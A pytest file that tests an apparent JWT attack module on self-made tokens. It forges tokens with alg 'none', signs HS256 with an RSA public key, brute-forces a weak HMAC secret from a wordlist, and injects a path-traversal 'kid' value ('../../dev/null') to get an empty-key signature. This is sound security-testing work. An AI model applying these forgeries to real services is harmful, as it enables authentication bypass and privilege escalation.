"""JWT algorithm-confusion primitive tests."""
from __future__ import annotations

import base64
import hashlib
import hmac
import json

import jwt as pyjwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

from genesis_crypto import jwt_confusion


def _b64d(s: str) -> bytes:
    s = s + "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s)


def _hs256_token(secret: bytes, payload: dict) -> str:
    return pyjwt.encode(payload, secret, algorithm="HS256")


def _rs256_keypair_and_token(payload: dict):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pub_pem = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    token = pyjwt.encode(payload, priv_pem, algorithm="RS256")
    return token, pub_pem.decode("ascii")


def test_alg_none_produces_four_case_variants():
    tok = _hs256_token(b"any-secret", {"sub": "alice", "role": "user"})
    r = jwt_confusion.attack(
        mode="alg_none",
        token=tok,
        mutations={"role": "admin"},
    )
    assert r["ok"] is True, r
    algs = [t["alg_tried"] for t in r["forged_tokens"]]
    assert "none" in algs and "NONE" in algs
    # Verify the first forged token has admin role.
    ft = r["forged_tokens"][0]["token"]
    payload = json.loads(_b64d(ft.split(".")[1]))
    assert payload["role"] == "admin"


def test_hs_rs_swap_signs_with_public_key_bytes():
    token, pub_pem = _rs256_keypair_and_token({"sub": "bob"})
    r = jwt_confusion.attack(
        mode="hs_rs_swap",
        token=token,
        public_key_pem=pub_pem,
        target_alg="HS256",
        mutations={"sub": "admin"},
    )
    assert r["ok"] is True, r
    forged = r["forged_token"]
    header_b64, payload_b64, sig_b64 = forged.split(".")
    expected = hmac.new(
        pub_pem.encode("ascii"),
        f"{header_b64}.{payload_b64}".encode(),
        hashlib.sha256,
    ).digest()
    actual_sig = _b64d(sig_b64)
    assert actual_sig == expected
    payload = json.loads(_b64d(payload_b64))
    assert payload["sub"] == "admin"


def test_weak_secret_brute_forces_hs256():
    secret = b"p@ssw0rd"
    tok = _hs256_token(secret, {"sub": "carol"})
    r = jwt_confusion.attack(
        mode="weak_secret",
        token=tok,
        wordlist=["admin", "letmein", "p@ssw0rd", "correcthorse"],
    )
    assert r["ok"] is True, r
    assert r["secret"] == "p@ssw0rd"
    assert r["tried"] == 3


def test_weak_secret_returns_not_found_when_wordlist_misses():
    tok = _hs256_token(b"never-in-wordlist", {"sub": "dan"})
    r = jwt_confusion.attack(
        mode="weak_secret",
        token=tok,
        wordlist=["x", "y", "z"],
    )
    assert r["ok"] is False
    assert "not found" in r["reason"]


def test_kid_inject_signs_with_assumed_file_contents():
    tok = _hs256_token(b"original-secret", {"sub": "eve"})
    r = jwt_confusion.attack(
        mode="kid_inject",
        token=tok,
        kid="../../dev/null",
        key_bytes="",
        target_alg="HS256",
        mutations={"sub": "admin"},
    )
    assert r["ok"] is True, r
    header_b64, payload_b64, sig_b64 = r["forged_token"].split(".")
    header = json.loads(_b64d(header_b64))
    assert header["kid"] == "../../dev/null"
    # Empty file → empty-key HMAC. Verify.
    expected = hmac.new(b"", f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
    assert _b64d(sig_b64) == expected
